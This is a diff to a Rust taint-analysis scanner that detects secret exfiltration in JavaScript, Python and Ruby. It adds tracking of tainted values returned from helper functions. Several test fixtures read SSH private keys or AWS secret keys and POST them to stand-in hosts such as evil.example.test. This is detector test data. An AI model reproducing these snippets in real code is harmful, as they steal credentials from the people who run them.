@@ -607,18 +607,145 @@ fn looks_like_exfil_command(s: &str) -> bool {
 
 type TaintMap = std::collections::HashMap<String, (Capability, &'static str)>;
 
-/// A small def-use taint pass, now **scoped by function**. A variable
-/// assigned in a scope is visible in that scope and every nested one
-/// (closures capture outer bindings), but NOT in a sibling function — so
-/// `function a(){ k = readKey() }` no longer taints `function b(){ post(k) }`
-/// unless `k` is genuinely module-level. Still intraprocedural: no
-/// call-return modelling, no shadowing.
+/// A small def-use taint pass, **scoped by function** and with a shallow
+/// interprocedural step. A variable assigned in a scope is visible in
+/// that scope and every nested one (closures capture outer bindings), but
+/// NOT in a sibling function — so `function a(){ k = readKey() }` no
+/// longer taints `function b(){ post(k) }` unless `k` is genuinely
+/// module-level. Before the main pass, every function is checked for
+/// "does it `return` tainted data"; a call to such a function is then
+/// itself treated as a taint source (the common `const x = grab()`
+/// helper pattern). One level of summary, iterated to a fixed point; no
+/// recursion unrolling, no shadowing.
 fn trace_exfiltration(root: Node, src: &[u8], lang: AstLang, path: &Path) -> Vec<CapabilityFinding> {
+    let returns = function_return_taints(root, src, lang);
     let mut out = Vec::new();
     let mut reported: HashSet<(Capability, usize)> = HashSet::new();
     let empty = TaintMap::new();
-    analyze_scope(root, src, lang, path, &empty, &mut out, &mut reported);
+    analyze_scope(root, src, lang, path, &empty, &returns, &mut out, &mut reported);
     out
+}
+
+/// name → the taint a function returns. Fixed-point: a function that
+/// returns the result of another tainted-returning function counts too.
+fn function_return_taints(root: Node, src: &[u8], lang: AstLang) -> TaintMap {
+    let mut scopes = Vec::new();
+    collect_all_scopes(root, &mut scopes);
+    let mut returns = TaintMap::new();
+    for _ in 0..4 {
+        let mut changed = false;
+        for &scope in &scopes {
+            let Some(name) = function_name(scope, src, lang) else {
+                continue;
+            };
+            if returns.contains_key(&name) {
+                continue;
+            }
+            if let Some(sec) = scope_returns_taint(scope, src, lang, &returns) {
+                returns.insert(name, sec);
+                changed = true;
+            }
+        }
+        if !changed {
+            break;
+        }
+    }
+    returns
+}
+
+fn collect_all_scopes<'a>(node: Node<'a>, out: &mut Vec<Node<'a>>) {
+    if is_scope_node(node.kind()) {
+        out.push(node);
+    }
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        collect_all_scopes(child, out);
+    }
+}
+
+/// The declared name of a function scope — a `function_declaration` /
+/// `method_definition` / Python `function_definition` / Ruby `method`
+/// name, or the identifier a `const f = () => …` arrow is bound to.
+fn function_name(scope: Node, src: &[u8], lang: AstLang) -> Option<String> {
+    if let Some(n) = scope.child_by_field_name("name") {
+        return Some(text(n, src).to_string());
+    }
+    // Anonymous function/arrow bound to a variable or an object property.
+    let parent = scope.parent()?;
+    match (parent.kind(), lang) {
+        ("variable_declarator", AstLang::JavaScript) => {
+            parent.child_by_field_name("name").map(|n| text(n, src).to_string())
+        }
+        ("assignment_expression", AstLang::JavaScript) => {
+            parent.child_by_field_name("left").map(|n| text(n, src).to_string())
+        }
+        ("pair", AstLang::JavaScript) => {
+            parent.child_by_field_name("key").map(|n| text(n, src).to_string())
+        }
+        ("assignment", AstLang::Python | AstLang::Ruby) => {
+            parent.child_by_field_name("left").map(|n| text(n, src).to_string())
+        }
+        _ => None,
+    }
+}
+
+/// Seed + fixed-point taint over a scope's direct statements only — no
+/// sink reporting, no recursion into nested scopes. Shared by
+/// `analyze_scope` and `scope_returns_taint`.
+fn compute_scope_taint(
+    scope: Node,
+    src: &[u8],
+    lang: AstLang,
+    inherited: &TaintMap,
+    returns: &TaintMap,
+) -> TaintMap {
+    let mut tainted = inherited.clone();
+    for _ in 0..6 {
+        let mut changed = false;
+        for_each_direct(scope, &mut |node| {
+            if let Some((name, rhs)) = assignment_parts(node, src, lang) {
+                if let Some(sec) = expr_taint(rhs, src, lang, &tainted, returns) {
+                    if tainted.insert(name, sec).map(|p| p.0) != Some(sec.0) {
+                        changed = true;
+                    }
+                }
+            }
+            if let Some((recv, sec)) = receiver_taint(node, src, lang, &tainted) {
+                if let std::collections::hash_map::Entry::Vacant(e) = tainted.entry(recv) {
+                    e.insert(sec);
+                    changed = true;
+                }
+            }
+        });
+        if !changed {
+            break;
+        }
+    }
+    tainted
+}
+
+/// Does this function scope `return` (JS/Py) — or, for Ruby, end its body
+/// with — a tainted value?
+fn scope_returns_taint(
+    scope: Node,
+    src: &[u8],
+    lang: AstLang,
+    returns: &TaintMap,
+) -> Option<(Capability, &'static str)> {
+    let tainted = compute_scope_taint(scope, src, lang, &TaintMap::new(), returns);
+    let mut hit = None;
+    for_each_direct(scope, &mut |node| {
+        if hit.is_some() {
+            return;
+        }
+        let is_return = matches!(node.kind(), "return_statement" | "return");
+        if is_return {
+            if let Some(sec) = expr_taint(node, src, lang, &tainted, returns) {
+                hit = Some(sec);
+            }
+        }
+    });
+    hit
 }
 
 fn is_scope_node(kind: &str) -> bool {
@@ -636,9 +763,11 @@ fn is_scope_node(kind: &str) -> bool {
             // Ruby
             | "method"
             | "singleton_method"
-            | "do_block"
-            | "block"
     )
+    // NOT "block" — that is Python's function *body*, and Ruby's
+    // `do…end` / `{…}` blocks are close enough to the enclosing method's
+    // scope (they capture its locals) that folding them in is a safe
+    // over-approximation.
 }
 
 /// Visit every node under `scope` that belongs to `scope` directly —
@@ -688,40 +817,16 @@ fn analyze_scope(
     lang: AstLang,
     path: &Path,
     inherited: &TaintMap,
+    returns: &TaintMap,
     out: &mut Vec<CapabilityFinding>,
     reported: &mut HashSet<(Capability, usize)>,
 ) {
-    let mut tainted = inherited.clone();
-
-    // Seed + fixed-point propagation over this scope's direct statements.
-    for _ in 0..6 {
-        let mut changed = false;
-        for_each_direct(scope, &mut |node| {
-            if let Some((name, rhs)) = assignment_parts(node, src, lang) {
-                if let Some(sec) = expr_taint(rhs, src, lang, &tainted) {
-                    if tainted.insert(name, sec).map(|p| p.0) != Some(sec.0) {
-                        changed = true;
-                    }
-                }
-            }
-            // `buf.append(_, secret)` / `sock.write(secret)` taints `buf` /
-            // `sock` — a common way to stage data for a later send.
-            if let Some((recv, sec)) = receiver_taint(node, src, lang, &tainted) {
-                if let std::collections::hash_map::Entry::Vacant(e) = tainted.entry(recv) {
-                    e.insert(sec);
-                    changed = true;
-                }
-            }
-        });
-        if !changed {
-            break;
-        }
-    }
+    let tainted = compute_scope_taint(scope, src, lang, inherited, returns);
 
     // Sink check over this scope's direct calls.
     for_each_direct(scope, &mut |node| {
         if is_call(node.kind()) {
-            check_exfil_sink(node, src, lang, path, &tainted, out, reported);
+            check_exfil_sink(node, src, lang, path, &tainted, returns, out, reported);
         }
     });
 
@@ -729,19 +834,21 @@ fn analyze_scope(
     let mut nested = Vec::new();
     nested_scopes(scope, &mut nested);
     for child_scope in nested {
-        analyze_scope(child_scope, src, lang, path, &tainted, out, reported);
+        analyze_scope(child_scope, src, lang, path, &tainted, returns, out, reported);
     }
 }
 
 /// A call is an exfiltration sink if it is a network sink and a
 /// data-bearing argument is tainted, OR it is a shell exec whose arguments
 /// carry both a network tool (`curl`/`wget`/`nc`) and a tainted value.
+#[allow(clippy::too_many_arguments)]
 fn check_exfil_sink(
     node: Node,
     src: &[u8],
     lang: AstLang,
     path: &Path,
     tainted: &TaintMap,
+    returns: &TaintMap,
     out: &mut Vec<CapabilityFinding>,
     reported: &mut HashSet<(Capability, usize)>,
 ) {
@@ -775,7 +882,7 @@ fn check_exfil_sink(
     let via_var = ids
         .iter()
         .find_map(|id| tainted.get(id).map(|s| (*s, id.clone())));
-    let via_inline = expr_taint(args, src, lang, tainted).map(|s| (s, String::new()));
+    let via_inline = expr_taint(args, src, lang, tainted, returns).map(|s| (s, String::new()));
 
     let Some(((cap, label), var)) = via_var.or(via_inline) else {
         return;
@@ -851,20 +958,41 @@ fn receiver_taint(
         return None;
     }
     let args = node.child_by_field_name("arguments")?;
-    let sec = expr_taint(args, src, lang, tainted)?;
+    let sec = expr_taint(args, src, lang, tainted, &TaintMap::new())?;
     Some((text(recv, src).to_string(), sec))
 }
 
-/// Taint of an expression: an inline secret read, or a reference to an
-/// already-tainted name.
+/// Taint of an expression: an inline secret read, a reference to an
+/// already-tainted name, or a call to a function summarised as
+/// returning tainted data.
 fn expr_taint(
     node: Node,
     src: &[u8],
     lang: AstLang,
     tainted: &TaintMap,
+    returns: &TaintMap,
 ) -> Option<(Capability, &'static str)> {
     if let Some(sec) = expr_is_secret_source(node, src, lang) {
         return Some(sec);
+    }
+    if !returns.is_empty() {
+        let mut hit = None;
+        walk(node, &mut |n| {
+            if hit.is_some() || !is_call(n.kind()) {
+                return;
+            }
+            if let Some(callee) = callee_path(n, src, lang) {
+                // match on the bare function name (`grab`) or a method
+                // name (`this.grab` → `grab`)
+                let name = callee.rsplit('.').next().unwrap_or(&callee);
+                if let Some(sec) = returns.get(name).or_else(|| returns.get(&callee)) {
+                    hit = Some(*sec);
+                }
+            }
+        });
+        if hit.is_some() {
+            return hit;
+        }
     }
     descendant_identifiers(node, src)
         .iter()
@@ -1216,6 +1344,67 @@ requests.post("https://evil.example.test", data=buf)
             const entry = cache.get(region);
         "#;
         assert!(!has_taint(src, AstLang::JavaScript));
+    }
+
+    #[test]
+    fn taint_through_a_helper_functions_return_value() {
+        // `grab()` returns the SSH key; `main` posts `grab()`'s result.
+        // The interprocedural summary must connect them across the call.
+        let src = r#"
+            const fs = require('fs');
+            const os = require('os');
+            function grab() {
+              return fs.readFileSync(require('path').join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');
+            }
+            async function main() {
+              const data = grab();
+              await fetch('https://evil.example.test/i', { method: 'POST', body: data });
+            }
+            main();
+        "#;
+        assert!(has_taint(src, AstLang::JavaScript), "{:?}", analyze(src, AstLang::JavaScript, Path::new("t")));
+    }
+
+    #[test]
+    fn taint_through_a_helper_returning_an_object_literal() {
+        let src = r#"
+            const fs = require('fs');
+            function collect() {
+              const material = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
+              return { material };
+            }
+            async function report() {
+              await fetch('https://c.example.test', { method: 'POST', body: JSON.stringify(collect()) });
+            }
+            report();
+        "#;
+        assert!(has_taint(src, AstLang::JavaScript));
+    }
+
+    #[test]
+    fn helper_that_returns_a_non_secret_is_not_a_taint_source() {
+        let src = r#"
+            const fs = require('fs');
+            function loadConfig() { return JSON.parse(fs.readFileSync('./config.json', 'utf8')); }
+            async function main() {
+              await fetch('https://api.example.com', { method: 'POST', body: JSON.stringify(loadConfig()) });
+            }
+            main();
+        "#;
+        assert!(!has_taint(src, AstLang::JavaScript));
+    }
+
+    #[test]
+    fn python_helper_return_taint() {
+        let src = r#"
+import os, requests
+def get_token():
+    return os.environ["AWS_SECRET_ACCESS_KEY"]
+def send():
+    requests.post("https://evil.example.test", data={"t": get_token()})
+send()
+"#;
+        assert!(has_taint(src, AstLang::Python));
     }
 
     #[test]
